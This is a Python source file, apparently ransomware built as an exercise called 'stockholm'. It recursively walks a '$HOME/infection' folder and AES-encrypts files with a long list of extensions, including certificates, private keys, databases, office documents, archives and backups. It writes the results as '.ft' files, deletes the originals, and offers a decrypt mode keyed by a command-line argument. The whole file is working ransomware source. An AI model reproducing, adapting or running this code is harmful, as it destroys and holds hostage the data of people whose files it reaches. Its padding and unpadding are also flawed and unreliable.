import argparse, sys, os
from Crypto.Cipher import AES

file_extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')


def process_dir(dirname, silent, reverse_key):
    olddir = os.getcwd()
    try:
        os.chdir(dirname)
        if not silent:
            print("Entering: " + dirname)
    except:
        return None
    files = os.listdir()
    for file in files:
        if os.path.isdir(file):
            process_dir(file, silent, reverse_key)
        elif os.path.isfile(file):
            if reverse_key == None and file.endswith(file_extensions):
                print("Encrypt")
                cipher_file(file, silent)
            elif reverse_key != None and file.endswith(".ft"):
                print("Decrypt")
                decipher_file(file, silent, reverse_key[0])
    try:
        os.chdir(olddir)
        if not silent:
            print("Back to: " + olddir)
    except:
        return None

def cipher_file(filename, silent):
    key = 'a quien buen arbol se arrima ...'
    cipher = AES.new(key, AES.MODE_ECB, '0123456789abcdef')
    try:
        src = open(filename, mode='br')
        dst = open(filename + '.ft', mode='bw')
    except:
        return None
    content = src.read()
    if content[0:1] != b'*':
        content = content.rjust(len(content) + (16 - len(content) % 16) , b'*')
    else:
        content = content.rjust(len(content) + (16 - len(content) % 16) , b'#')
    dst.write(cipher.encrypt(content))
    if not silent:
        print ("File: " + filename)
    src.close()
    dst.close()
    os.remove(filename)

def decipher_file(filename, silent, key):
    cipher = AES.new(key, AES.MODE_ECB, '0123456789abcdef')
    try:
        src = open(filename, mode='br')
        dst = open(filename[:-3], mode='bw')
    except:
        return None
    content = src.read()
    content = cipher.decrypt(content)
    content = content.lstrip(content[0:1])
    dst.write(content)
    if not silent:
        print ("File: " + filename)
    src.close()
    dst.close()
    os.remove(filename)


parser = argparse.ArgumentParser(description='File encryptor.')
parser.add_argument('-v', '--version', action='version', version='stockholm 4.2')
parser.add_argument('-s', '--silent', dest='silent', action='store_true')
parser.add_argument('-r', '--reverse', nargs=1, dest='reverse', metavar='encryption key')
args = parser.parse_args(sys.argv[1:])

try:
    infectdir = os.environ.get('HOME') + '/infection'
except:
    quit()
process_dir(infectdir, args.silent, args.reverse);
